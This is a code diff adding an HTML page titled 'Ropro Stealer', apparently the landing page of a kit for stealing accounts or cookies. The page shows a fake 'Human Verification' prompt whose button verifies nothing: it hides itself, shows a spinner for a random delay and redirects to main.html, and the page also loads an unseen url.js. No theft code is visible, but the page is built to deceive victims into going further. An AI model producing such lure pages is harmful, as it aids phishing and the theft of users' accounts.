@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ropro Stealer | Fav_Tool</title>
+        <link rel="icon" href="https://cdn3.emoji.gg/emojis/11607-purple-jeffree-star.png" type="image/png">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            background: rgba(20, 0, 30, 0.8);
+            padding: 2rem;
+            border-radius: 8px;
+            border: 1px solid #6a0dad;
+            box-shadow: 0 0 20px #6a0dad;
+            width: 300px;
+        }
+        button {
+            background: #6a0dad;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #8e44ad;
+        }
+        .loader {
+            display: none;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #9b59b6;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Human Verification</h2>
+        <p>Please click below to verify you're human</p>
+        <button id="verifyBtn">Verify Now</button>
+        <div class="loader" id="loader"></div>
+    </div>
+<script src="url.js"></script>
+    <script>
+        document.getElementById('verifyBtn').addEventListener('click', function() {
+            const btn = document.getElementById('verifyBtn');
+            const loader = document.getElementById('loader');
+            
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            
+            const delay = Math.floor(Math.random() * 2000) + 3000;
+            
+            setTimeout(function() {
+                window.location.href = 'main.html';
+            }, delay);
+        });
+    </script>
+</body>
+</html>
